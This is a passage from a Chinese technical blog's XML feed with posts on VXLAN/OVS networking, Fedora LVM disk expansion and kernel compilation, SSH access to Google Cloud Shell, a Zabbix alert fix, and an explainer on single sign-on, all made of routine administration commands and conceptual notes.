class="line">![ping](https://upload-images.jianshu.io/upload_images/6269327-07558cf3eb185285.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line">到这里，基本已经利用Linux的ip link把三个机器通过点到点Vxlan连接起来了，因为我的实验的场景特殊，需要进行二层流量镜像，所以下面加入OVS以便进行底层流量镜像。</span><br><span class="line">## OVS</span><br><span class="line">这里大致思路就是在Test服务器上利用OVS搭建一个网桥，然后把两个vxlan网卡加到这个网桥就可以啦。</span><br></pre></td></tr></table></figure></p><p>#构建一个br0的网桥<br>ovs-vsctl add-br br0</p><h1 id="把两个vxlan网卡加到br0中"><a href="#把两个vxlan网卡加到br0中" class="headerlink" title="把两个vxlan网卡加到br0中"></a>把两个vxlan网卡加到br0中</h1><p>ovs-vsctl add-port br0 vxlan0<br>ovs-vsctl add-port br0 vxlan1</p><h1 id="给br0配上一个ip，并启动"><a href="#给br0配上一个ip，并启动" class="headerlink" title="给br0配上一个ip，并启动"></a>给br0配上一个ip，并启动</h1><p>ifconfig br0 192.168.0.1/24 up<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里不要忘记手动更改路由，删除之前vxlan0和vxlan1的路由，把所有192.168.0.0/24的指向br0网桥就可以了。</span><br></pre></td></tr></table></figure></p><p>#删除两个路由<br>ip route del 192.168.0.0/24 dev vxlan0 proto kernel scope link src 192.168.0.4<br>ip route del 192.168.0.0/24 dev vxlan1 proto kernel scope link src 192.168.0.5</p><p>#添加br0的路由，这个会自动添加，没有就手动添加一下<br>ip route add 192.168.0.0/24 dev br0 proto kernel scope link src 192.168.0.1<br><code>`</code><br>到这里就可以进行ping测试了。后面的实验就是对网桥上port的操作，就不多说了。<br>[参考]<a href="https://juejin.im/post/6844904126539628557" target="_blank" rel="noopener">https://juejin.im/post/6844904126539628557</a><br>[参考]<a href="https://cizixs.com/2017/09/28/linux-vxlan/" target="_blank" rel="noopener">https://cizixs.com/2017/09/28/linux-vxlan/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;OVS-Linux-Vxlan组网&quot;&gt;&lt;a href=&quot;#OVS-Li
      
    
    </summary>
    
      <category term="基础网络" scheme="https://XD0ne.github.io/categories/%E5%9F%BA%E7%A1%80%E7%BD%91%E7%BB%9C/"/>
    
    
      <category term="基础网络" scheme="https://XD0ne.github.io/tags/%E5%9F%BA%E7%A1%80%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>Fedora虚拟机扩容及编译安装新内核</title>
    <link href="https://XD0ne.github.io/2020/03/10/35.Fedora%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%AE%B9%E5%8F%8A%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E6%96%B0%E5%86%85%E6%A0%B8/"/>
    <id>https://XD0ne.github.io/2020/03/10/35.Fedora虚拟机扩容及编译安装新内核/</id>
    <published>2020-03-09T17:00:00.000Z</published>
    <updated>2020-03-09T18:30:49.257Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="Fedora虚拟机扩容及编译安装新内核"><a href="#Fedora虚拟机扩容及编译安装新内核" class="headerlink" title="Fedora虚拟机扩容及编译安装新内核"></a>Fedora虚拟机扩容及编译安装新内核</h1><hr><h2 id="虚拟机扩容"><a href="#虚拟机扩容" class="headerlink" title="虚拟机扩容"></a>虚拟机扩容</h2><ol><li>关闭虚拟机，在虚拟机管理软件上分配新的硬盘容量（之前20G，现在40G）。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-3b6a36c094f833f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li><li>启动虚拟机，进行根目录空间扩容。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://upload-images.jianshu.io/upload_images/6269327-a41c394a6aef663d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1"><br>可以看到磁盘是/dev/sda总共为40G，但是下面两个分区一共只有20G，说明还有20G没有分区，需要我们手动进行分区和挂载。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sda</span><br></pre></td></tr></table></figure></p><p>对/dev/sda未分区的空间进行分区<br><img src="https://upload-images.jianshu.io/upload_images/6269327-d30972d7d92c6333.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>输入n进行分区，全选默认创建一个分区号为3，容量为20G的主分区，并输入w保存并退出！<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-00956860fa881f64.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可看到新的分区已经有了，但是新的分区的ID是83并不是LVM文件系统的ID，我们需要将其改为文件系统的ID：8e才能挂载到文件系统根目录。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk /dev/sda</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-c386cce35b22a374.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-2b608e9a32b2a245.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>输入t进行修改分区ID，查看LVM文件系统为8e，修改，然后w保存。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p>查看修改成功<br><img src="https://upload-images.jianshu.io/upload_images/6269327-ff65f2b39388135d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>接着就行根目录挂载。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkfs.ext4 /dev/sda3</span><br></pre></td></tr></table></figure></p><p>将该分区创建为文件系统<br><img src="https://upload-images.jianshu.io/upload_images/6269327-85a111666af40411.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pvcreate /dev/sda3</span><br></pre></td></tr></table></figure></p><p>将该分区初始化为物理卷<br><img src="https://upload-images.jianshu.io/upload_images/6269327-d8ad0f8a09f42c17.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pvdisplay</span><br></pre></td></tr></table></figure></p><p>查看物理卷<br><img src="https://upload-images.jianshu.io/upload_images/6269327-e344e406a176848e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>sda2是之前的LVM物理卷，sda3是新的我们创建的物理卷。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vgdisplay</span><br></pre></td></tr></table></figure></p><p>查看当前需要扩充的lvm组名，可以通过vgdisplay查看：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-73a526d5b6f80ffd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vgextend fedora_localhost-live /dev/sda3</span><br></pre></td></tr></table></figure></p><p>为需要扩充的lvm添加卷<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b617280b52e87058.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lvextend -L+19.96G /dev/fedora_localhost-live/root   /dev/sda3</span><br></pre></td></tr></table></figure></p><p>添加容量<br><img src="https://upload-images.jianshu.io/upload_images/6269327-3b9315a003524a51.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">resize2fs /dev/fedora_localhost-live/root</span><br></pre></td></tr></table></figure></p><p>最后使用resize2fs命令，用于扩大或者缩小未挂载的ext2,ext3或者是ext4文件系统。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-8331183f0248b44f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure></p><p>查看结果，某些版本需重启生效。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-aa0ef08c1013c98b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="编译安装内核"><a href="#编译安装内核" class="headerlink" title="编译安装内核"></a>编译安装内核</h2><p>安装所需软件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dnf install ncurses-devel flex bison openssl-devel binutils gcc make patch libgomp glibc-headers glibc-devel kernel-headers kernel-devel dkms -y</span><br></pre></td></tr></table></figure></p><p>下载内核源码<a href="http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/v5.x/" target="_blank" rel="noopener">上海交大内核源码库</a><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/v5.x/linux-5.0.1.tar.gz</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar xf linux-5.0.1.tar.gz -C /usr/src</span><br></pre></td></tr></table></figure><p>解压到/usr/src目录下。<br>进入解压目录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /usr/src/linux-5.0.1/</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-e10bf9ac4ca7f29f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>General setup —&gt;local version -append to kernel release<br><img src="https://upload-images.jianshu.io/upload_images/6269327-93b2cee0d450d3ba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>新添加NTFS文件系统支持模块：</p><p>File systems —&gt;DOS/FAT/NT Filesystems —&gt;NTFS file system support</p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-b40a8f16c20102b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>建议选择以模块方式(M选项)编译。（*号则是以静态方式编译打包进内核文件中，如果新添加的模块较多，会导致内核文件体积增大）<br>并在下面的NTFS write support 那里用y键启用<br><img src="https://upload-images.jianshu.io/upload_images/6269327-f6234764da3b74f2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>保存 并退出<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make -j 4</span><br></pre></td></tr></table></figure></p><p>很长时间，后面数字代表几核。双核可能三个小时以上把<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make modules_install</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;Fedora虚拟机扩容及编译安装新内核&quot;&gt;&lt;a href=&quot;#Fedo
      
    
    </summary>
    
      <category term="其他" scheme="https://XD0ne.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="其他" scheme="https://XD0ne.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>推荐-Google Cloud Shell</title>
    <link href="https://XD0ne.github.io/2020/03/05/34.%E6%8E%A8%E8%8D%90-Google%20Cloud%20Shell/"/>
    <id>https://XD0ne.github.io/2020/03/05/34.推荐-Google Cloud Shell/</id>
    <published>2020-03-04T17:00:00.000Z</published>
    <updated>2020-03-04T17:00:54.507Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="推荐-Google-Cloud-Shell"><a href="#推荐-Google-Cloud-Shell" class="headerlink" title="推荐-Google Cloud Shell"></a>推荐-Google Cloud Shell</h1><hr><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>作为一名安全从业者，服务器从来是不嫌多的，阿里云学生优惠都买到了2022年了。当然国外的服务器需求更是强烈，有时候确实真的除了搭梯子真的没啥用，不过自己搭建的梯子真的不如机场的，不管什么敏感时期照样youtube 4k飞起，虽然很多机场都是按流量卖的，但是IPLC和BGP成本确实高啊。总而言之，国外的服务器在我的日常工作中可以说是很重要但是不紧急的事情，只有在特定情况下才会需要，比如某次项目在一定时间内下一些国外的数据之类的。又不想花钱买，有时候白嫖一些也是放着没用，朋友推荐需要直接腾讯云开计时的（也得花钱）。<br>当然这不是一篇薅羊毛的指导，想薅服务器搭梯子的就算了，只给有需要的朋友分享。</p><h1 id="Cloud-Shell"><a href="#Cloud-Shell" class="headerlink" title="Cloud Shell"></a>Cloud Shell</h1><p>基于前面的需求，反正结果就是碰到了Google Cloud Shell，简单介绍一下。看图：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-6ac228d30f70eb95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="shell"><br>简而言之google免费提供的一个linux的服务器，并且提供了web浏览器控制和管理：<a href="https://ssh.cloud.google.com/" target="_blank" rel="noopener">https://ssh.cloud.google.com/</a><br><img src="https://upload-images.jianshu.io/upload_images/6269327-9550d3992cb8e726.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1"><br>上面是图形化的文件操作，下面是终端，很舒服的哈，先看看服务器的配置情况：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-07054ac2f665dce7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-3086b157b899f905.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="网速"><br>2核2g 50g硬盘，稳定10m/s的网速，这么高的配置，全免费？？？当然是不可能的啦，我们现在具体来看看这东西的限制条件：</p><ol><li>每周只有50h的使用时间<br><img src="https://upload-images.jianshu.io/upload_images/6269327-118edc9aef382732.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1"></li><li>断开连接20分钟之后会清空服务器，但是免费有5G的空间，在$HOME目录，所以重要文件记得保存在该目录下。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-702bb9c51893061d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li><li>现在免费，不知道啥时候收费<br><img src="https://upload-images.jianshu.io/upload_images/6269327-88777909f292cee2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>除了一些限制条件，google的cloud shell还可以变身，就是性能变得更强<br><img src="https://upload-images.jianshu.io/upload_images/6269327-f76d5945cfc38fee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>这个大概就是增强到2核4g左右，不过不造有没有次数限制之类的。<h1 id="本地ssh-Google-Cloud-Shell"><a href="#本地ssh-Google-Cloud-Shell" class="headerlink" title="本地ssh Google Cloud Shell"></a>本地ssh Google Cloud Shell</h1>大概简单介绍了一下Google的Cloud Shell，现在看看怎么本地ssh这台服务器，真正的把他用起来，而不是得靠浏览器。</li><li>下载google的sdk，链接：<a href="https://cloud.google.com/sdk/" target="_blank" rel="noopener">https://cloud.google.com/sdk/</a>，下载对应系统的就行。</li><li>安装，先大概看看官方文档：<a href="https://cloud.google.com/sdk/docs/quickstart-macos?hl=zh-cn" target="_blank" rel="noopener">https://cloud.google.com/sdk/docs/quickstart-macos?hl=zh-cn</a></li><li>我使用的是mac系统，大概讲一下mac系统安装的过程。</li></ol><ul><li>进入指定文件夹<br><img src="https://upload-images.jianshu.io/upload_images/6269327-94a9c9b9929b8bba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li><li>执行安装<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./install.sh</span><br></pre></td></tr></table></figure></li></ul><p>一路回车，会自动添加环境变量。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-2236b40fda561699.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="PATH"></p><ul><li>初始化<br>环境变量自动添加后就可以使用sdk的一些命令了，下面进行初始化<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcloud init --console-only</span><br></pre></td></tr></table></figure></li></ul><p>–console-only是非交互授权，执行时可能会访问不了google的服务器，因为我们的终端没有挂代理，这个时候windows用户可以直接ssr全局代理，这里会提示我们是否使用代理，本地开始ssr，按提示挂上代理就行。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-7e00715a8ebce6ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>然后选择一个project就行，没有就创建一个。</p><ul><li>在~文件夹中执行下面命令（在用户的~文件夹中），创建ssh项目<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo gcloud alpha cloud-shell ssh</span><br></pre></td></tr></table></figure></li></ul><p>根据提示，这中间会生成ssh的公私钥，并且成功登陆服务器，这个时候提示上会显示从某某域名的某某端口成功登陆服务器，比如我的<br><img src="https://upload-images.jianshu.io/upload_images/6269327-5833488a66ce22f7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>端口是6000，但是没有截图了，注意域名的@之后的且.dev结尾的。登陆之后虽然不是root用户，但是在sudo组里。</p><ul><li>ssh登陆服务器<br>前面的创建ssh服务时，在~/.ssh文件夹中会生成公私钥，前面也知道了域名和端口，直接可以密钥登陆（可以用自己的账号，也可以用root）：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-92efecb2ae485759.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@devshell-vm-xxxxxxxxxxxxxxx-be72488c1221.cloudshell.dev -p 6000 -i google_compute_engine</span><br></pre></td></tr></table></figure></li></ul><p>优雅一点就在.ssh/config中<br><img src="https://upload-images.jianshu.io/upload_images/6269327-11af47a7710ba38d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="config"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-620254e7ec68ea90.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="优雅"><br>现在就可以啦，我试过重新创建一个项目，域名，公私钥都不会更新的，所以也不需要考虑二次修改的麻烦了。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>最后也没啥好说的把，如果用这服务器整梯子，确实很浪费，人家明显限制了你，所以根据自己需求吧，反正对我来说是很好也是很符合我需求的东西，对于20min的重置，可以找个机器crontab计划任务19分钟ssh一下就行，这样也可以在需要长时间使用时候的需求了。只是不知道他免费会持续多久<del>~</del><br>羊毛虽好，还是得各取所需。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;推荐-Google-Cloud-Shell&quot;&gt;&lt;a href=&quot;#推荐
      
    
    </summary>
    
      <category term="其他" scheme="https://XD0ne.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="其他" scheme="https://XD0ne.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>ZABBIX企业微信webhook告警踩坑</title>
    <link href="https://XD0ne.github.io/2019/12/26/33.ZABBIX%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1webhook%E5%91%8A%E8%AD%A6%E8%B8%A9%E5%9D%91/"/>
    <id>https://XD0ne.github.io/2019/12/26/33.ZABBIX企业微信webhook告警踩坑/</id>
    <published>2019-12-26T07:33:00.000Z</published>
    <updated>2020-03-04T17:00:47.720Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="ZABBIX企业微信webhook告警踩坑"><a href="#ZABBIX企业微信webhook告警踩坑" class="headerlink" title="ZABBIX企业微信webhook告警踩坑"></a>ZABBIX企业微信webhook告警踩坑</h1><hr><p><a href="https://blog.csdn.net/qq_41664031/article/details/100602253" target="_blank" rel="noopener">原教程连接链接</a><br>教程不够完善，有点坑，害我调试了好久。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-8bfd33989e9e5044.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="用户群组"><br>这里用户群组原教程设为：WHLAIX_IT，我这里设置的是Zabbix的管理用户，上面CSDN的教程中缺少了在用户组中添加告警媒介的一步。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-8bae96bd2db97866.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>用户–&gt;报警媒介<br><img src="https://upload-images.jianshu.io/upload_images/6269327-0e25fca303cb2aa6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-c49034c533183b2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>加上就行</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;ZABBIX企业微信webhook告警踩坑&quot;&gt;&lt;a href=&quot;#ZA
      
    
    </summary>
    
      <category term="安全知识" scheme="https://XD0ne.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://XD0ne.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>谈谈单点登录</title>
    <link href="https://XD0ne.github.io/2019/11/26/32.%E8%B0%88%E8%B0%88%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95/"/>
    <id>https://XD0ne.github.io/2019/11/26/32.谈谈单点登录/</id>
    <published>2019-11-26T07:33:00.000Z</published>
    <updated>2019-11-26T07:43:11.313Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="谈谈单点登录"><a href="#谈谈单点登录" class="headerlink" title="谈谈单点登录"></a>谈谈单点登录</h1><hr><p>寒假学习的小课题，把之前的笔记整理整理记录一下（长文警告）因为当时看到的东西涉及很多，所以有一些地方没有深入去探讨。</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ul><li>围绕“单点登录”，涉及到的概念会有radius jwt oauth openid saml sso等。</li><li>结合场景分析单点登录，并把几个似是而非的场景弄清楚。</li><li>以单点登录这个话题为开端和核心，向相关知识扩展。<h1 id="什么是单点登录（SSO）？"><a href="#什么是单点登录（SSO）？" class="headerlink" title="什么是单点登录（SSO）？"></a>什么是单点登录（SSO）？</h1>百度百科：单点登录（Single Sign On），简称为 SSO，是目前比较流行的企业业务整合的解决方案之一。SSO的定义是在多个应用系统中，用户只需要登录一次就可以访问所有相互信任的应用系统。<br>简而言之就是用户在多个相互信任的应用系统中，只需要登录一次，就可以访问其他相互信任的应用系统。这里的关键是一次登录，以及一次退出，都对所有的系统生效。<h1 id="普通登录"><a href="#普通登录" class="headerlink" title="普通登录"></a>普通登录</h1>在普通的登录中，比如典型的B/S情景，浏览器访问服务器，发送登录请求，在发送完用户名和密码之后，服务器会生成该用户的session来标准该用户的状态，比如已登录还是已注销，并给一个cookie给浏览器，因此，用户继续访问就会带上这个cookies，服务端会根据这个Cookie找到对应的session，通过session来判断这个用户的登录状态。比如php中使用phpsessid。当然也可以自定义session的生命周期，session的生命周期过长的话一旦session被盗用就会出现用户被窃取的情况。同时，生命周期过长的session配置会占用较多的服务器资源。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-47eb73afa35f8fe9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="php sessionid"><h1 id="单点登录的原理以及实现"><a href="#单点登录的原理以及实现" class="headerlink" title="单点登录的原理以及实现"></a>单点登录的原理以及实现</h1>单点登录主要针对同平台下多应用，多系统的情景下多次登录的一种解决方案。单点登录相当于将多个应用的认证体系联通。<br>假设现在一个平台上有3个都带有登录功能的应用，由上面的普通登录的情况可以想到，这3台服务器都会自己的记录session。那么要想达到单点登录，一个最简单的方法就出现了：共享session。<h2 id="共享session"><a href="#共享session" class="headerlink" title="共享session"></a>共享session</h2>共享session的方式来实现单点登录是最方便也是最直接的。在三个子系统中，使用同一个额外的记录session的服务器，比如我们可以使用一个redis服务器来存储三个系统的session。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-77efe1037b91e20d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="共享session"><br>用户登录了应用1，获取了应用1返回的cookies，再次访问应用1的其他功能的候携带了cookie就是已登录的状态了，但是这样又有新的问题，虽然实现了共享session，但是用户登录了应用1，获取了应用1返回的cookie，但是因为cookie是无法跨域的，因此用户无法使用应用1的cookie去访问应用2。这里我们就需要将系统的全局cookie domain的属性设置为顶级域名，比如应用1的域名是1.test.com，应用2的域名是2.test.com。在普通登录的情况下，应用1的cookie domain的属性是1.test.com，指这个cookie只能在该子域名上被使用。我们将系统的全局cookie domain设置为顶级域名，即.test.com，这样就可以实现用户登录了应用1，之后可以以已登录状态访问应用2和3。<br>上面的共享session的情况是三个应用都有登录功能，还有一种类似的情况是应用1和应用2都有登录模块和其他模块，还有一个单独的SSO系统，是仅有登录模块的：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-e9e9d376cc281abc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="共享session"><br>这种情况和上面很类似，同样是共享session的方式，SSO应用只提供登录服务，但是这里有一点不一样，一般情况下是将SSO应用的cookies设为顶级域名下，这样保证用户只有通过登录SSO之后才能访问其他应用，而不是随便登录一个系统就能登录平台内所有其他系统。这种情况的现象就是，通过各应用单独的模块登录只能访问该应用，通过SSO登录可以访问所有的应用。<br>还有一种情况是，所有应用都没有登录模块，而SSO仅提供登录模块。访问其他应用会自动跳转到SSO应用上，但这不是共享session的方式，下面会分析到。<br>共享session的方法虽然简单，但是存在局限性，因为使用了cookie顶域的特性，所以不能做到跨域。一个公司或者一个平台很可能不是所有的域名都在在一个一级域名之下的，所以同域名下的单点登录并不是完整的单点登录。<h2 id="基于openid的单点登录"><a href="#基于openid的单点登录" class="headerlink" title="基于openid的单点登录"></a>基于openid的单点登录</h2>先说说openid，openid是一种认证标准，规定如何认证的标准！即其关注的是登录时身份的认证。官方给出的一个场景，其中一方是一个openid身份服务器，用来存放注册好的openid账号，另一方是受这个openid身份服务器信赖的服务或应用。openid协议就是提供openid身份服务器和被信赖的服务或应用之间的通信的。比如我们在很多网站上可以使用QQ登录，这里的腾讯的QQ就是openid的身份服务器，我们所要登录的网站就是受信赖的服务或应用。<br>在使用openid实现单点登录的方法有很多，可以使用上面共享session的方法，即把openid带在cookie里面，但是这样也会出现一样的cookie跨域的问题。<br>在实际场景中，我们在访问提供服务的应用时检测到未登录就会直接跳转到openid身份服务器，或者没有重定向而是在登录表单附近点击选择使用第三方openid登录，进行账号密码登录（这可以保证我们所登录的服务器无法获取我们的敏感身份认证信息），具体流程如下：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-7c99347e7e212fc2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="OpenID"><br>上图是一次用户请求应用到完成认证的过程，简单总计一下就是：用户访问应用–&gt;应用重定向到认证服务器–&gt;用户在认证服务器进行登录–&gt;登录成功后携带一个认证信息重定向会原来的应用（如<a href="http://1.test.com?token=123456）--&gt;应用把这个token又发送到认证服务器进行验证--&gt;认证服务器确认信息无误后就响应用户的请求并写入cookie。" target="_blank" rel="noopener">http://1.test.com?token=123456）--&gt;应用把这个token又发送到认证服务器进行验证--&gt;认证服务器确认信息无误后就响应用户的请求并写入cookie。</a><br>这是一个单系统的认证过程，还需要实现多应用的单点认证。原理就很简单，用户访问应用2，然后跳转到认证服务器，因为已经认证过了，直接携带token重定向到应用2，然后应用2向认证服务器确认token的有效性，若有效就响应。<br>上面所说的会涉及到验证信息传递的过程，比如上面说的利用url重定向传递授权信息<a href="http://1.test.com?token=123456，也可以使用POST请求，避免token过长，超过get请求的范围。" target="_blank" rel="noopener">http://1.test.com?token=123456，也可以使用POST请求，避免token过长，超过get请求的范围。</a><h2 id="CAS实现单点登录"><a href="#CAS实现单点登录" class="headerlink" title="CAS实现单点登录"></a>CAS实现单点登录</h2>CAS全称为Central Authentication Service即中央认证服务，是一个企业多语言单点登录的解决方案，并努力去成为一个身份验证和授权需求的综合平台。CAS就是一个现成的单点登录的demo，企业只需要简单修改就可使用。<br>CAS支持各种协议，SAML，OAuth，OpenID，OIDC等等，支持LDAP，Radius，JWTX，509等等进行身份认证和授权，还有各种常用语言的客户端，Java，PHP，C# 等等。反正就是一个十分完整的，兼容性特别好的SSO框架。<br>简单了解CAS是如何实现单点登录的。在官网上可以看到其给出的一个<a href="https://apereo.github.io/cas/4.2.x/protocol/CAS-Protocol.htm" target="_blank" rel="noopener">流程图</a>，。这个图说的特别详细，一下就能看懂，直接原图上进行标注查看：<br><img 